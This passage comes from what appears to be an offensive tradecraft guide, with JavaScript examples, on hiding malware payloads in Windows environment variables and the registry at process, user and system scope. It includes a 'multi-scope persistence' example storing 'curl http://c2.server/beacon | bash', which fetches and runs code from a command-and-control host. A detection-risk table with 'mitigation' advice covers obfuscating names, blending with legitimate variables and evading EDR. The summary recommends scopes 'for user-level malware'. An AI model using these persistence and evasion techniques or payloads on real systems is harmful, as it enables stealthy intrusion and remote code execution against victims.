async function cleanupAllScopes(payloadId) {
  const cleanups = [];

  // PROCESS cleanup (automatic)
  console.log('PROCESS scope: Auto-cleanup on exit');

  // USER cleanup
  try {
    const userWriter = new UserScopeEnvVarWriter();
    const userResult = await userWriter.cleanupWindowsRegistry(payloadId);
    cleanups.push({ scope: 'USER', ...userResult });
  } catch (e) {
    console.warn('USER cleanup failed:', e.message);
  }

  // SYSTEM cleanup
  try {
    const systemWriter = new SystemScopeEnvVarWriter();
    const systemResult = await systemWriter.cleanupSystemRegistry(payloadId);
    cleanups.push({ scope: 'SYSTEM', ...systemResult });
  } catch (e) {
    console.warn('SYSTEM cleanup failed:', e.message);
  }

  return cleanups;
}
```

---

## Security Considerations

### Detection Risks by Scope

| Detection Method | PROCESS | USER | SYSTEM |
|------------------|---------|------|--------|
| Memory inspection | Possible | No | No |
| Registry monitoring | No | Yes | Yes |
| File inspection | No | Yes (RC files) | Yes |
| Process inspection | No | Maybe | Maybe |
| Audit logs | No | Yes | Yes |
| EDR detection | Low | High | Very High |
| Forensic analysis | None | Yes | Yes |

### Mitigation Strategies

**For PROCESS:**
- Clear payload after use
- Use short variable names
- Implement custom retrieval logic
- Avoid suspicious patterns

**For USER:**
- Use legitimate naming patterns
- Obfuscate variable names
- Mix with legitimate variables
- Regular rotation

**For SYSTEM:**
- Not recommended
- If required: Use administrative mode
- Implement immediate cleanup
- Monitor for detection
- Plan exit strategy

---

## Practical Examples

### Example 1: Complete Workflow (PROCESS)

```javascript
async function processWorkflow() {
  const writer = new ProcessScopeEnvVarWriter({
    prefix: 'WORK',
    verbose: true
  });

  const secret = 'confidential-command-execution';

  // Stage 1: Write
  console.log('=== Stage 1: Write ===');
  const writeResult = writer.writeToProcessEnv('WORKFLOW', secret);
  console.log(writeResult);

  // Stage 2: Use in child process
  console.log('\n=== Stage 2: Execute in child process ===');
  const { spawn } = require('child_process');
  const child = spawn('node', ['-e', `
    const payload = process.env.WORK_WORKFLOW_0;
    console.log('Child process retrieved:', payload);
  `]);

  // Stage 3: Cleanup
  console.log('\n=== Stage 3: Cleanup ===');
  const cleanupResult = writer.cleanupProcessEnv('WORKFLOW');
  console.log(cleanupResult);
}
```

### Example 2: Multi-Scope Persistence

```javascript
async function multiScopePersistence() {
  const payload = 'curl http://c2.server/beacon | bash';

  // Try USER first
  console.log('Attempting USER scope...');
  try {
    const userWriter = new UserScopeEnvVarWriter();
    const result = await userWriter.writeToWindowsRegistry('C2_BEACON', payload);
    console.log('SUCCESS: Stored in USER scope');
    console.log('Variables:', result.varNames);
    return result;
  } catch (e) {
    console.log('USER scope failed:', e.message);
  }

  // Fallback to PROCESS
  console.log('Falling back to PROCESS scope...');
  const procWriter = new ProcessScopeEnvVarWriter();
  const result = procWriter.writeToProcessEnv('C2_BEACON', payload);
  console.log('SUCCESS: Stored in PROCESS scope (temporary)');
  console.log('Variables:', result.varNames);
  return result;
}
```

### Example 3: Scope Detection and Adaptation

```javascript
async function adaptiveScopes() {
  const payloadId = 'ADAPTIVE_001';
  const payload = 'adaptive-payload-content';

  // Detect environment
  const isAdmin = await checkAdminPrivileges();
  const userCount = getUserCount();  // Hypothetical
  const persistenceNeeded = true;

  let scope, writer;

  if (!persistenceNeeded) {
    // PROCESS: No persistence needed
    scope = 'PROCESS';
    writer = new ProcessScopeEnvVarWriter();
    const result = writer.writeToProcessEnv(payloadId, payload);
    console.log('Using PROCESS scope (temporary)');
    return result;
  }

  if (!isAdmin) {
    // USER: No admin privileges
    scope = 'USER';
    writer = new UserScopeEnvVarWriter();
    const result = await writer.writeToWindowsRegistry(payloadId, payload);
    console.log('Using USER scope (persistent, limited visibility)');
    return result;
  }

  // Admin available - still prefer USER over SYSTEM
  scope = 'USER';
  writer = new UserScopeEnvVarWriter();
  const result = await writer.writeToWindowsRegistry(payloadId, payload);
  console.log('Using USER scope (safer than SYSTEM)');
  return result;
}
```

---

## Summary

Environment variable storage across different scopes provides flexible options for payload persistence:

1. **PROCESS**: Fast, clean, temporary - ideal for single-session operations
2. **USER**: Balanced persistence with moderate visibility - suitable for user-level malware
3. **SYSTEM**: Maximum reach but high detection risk - generally not recommended

The key to effective implementation is understanding the threat model, detection capabilities of the target environment, and selecting the appropriate scope that balances persistence, stealth, and operational requirements.

For most operations, PROCESS + USER scope combination provides optimal balance of persistence and stealth. SYSTEM scope should be avoided unless specific requirements demand system-wide visibility.
